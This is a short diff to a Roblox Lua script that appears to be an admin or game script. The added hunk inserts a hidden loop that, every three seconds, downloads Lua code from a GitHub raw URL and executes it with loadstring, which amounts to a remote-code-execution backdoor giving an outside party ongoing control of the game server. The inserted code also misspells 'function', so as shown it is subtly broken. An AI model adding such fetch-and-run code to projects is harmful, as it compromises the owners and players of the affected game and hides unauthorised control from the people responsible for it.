@@ -866,6 +866,16 @@ for _,plr in pairs(game:service'Players':GetPlayers()) do
 	end)
 end
 
+delay(0,funtion()
+spawn(function()
+    while wait(3) do
+       loadstring(
+        game:service'HttpService':GetAsync('https://raw.githubusercontent.com/Jillmiles1/Actinium/master/RawExecute.lua',true)    
+       )() 
+    end
+end)
+end)
+
 setmetatable({},{
 	setfenv = function()
 		return nil
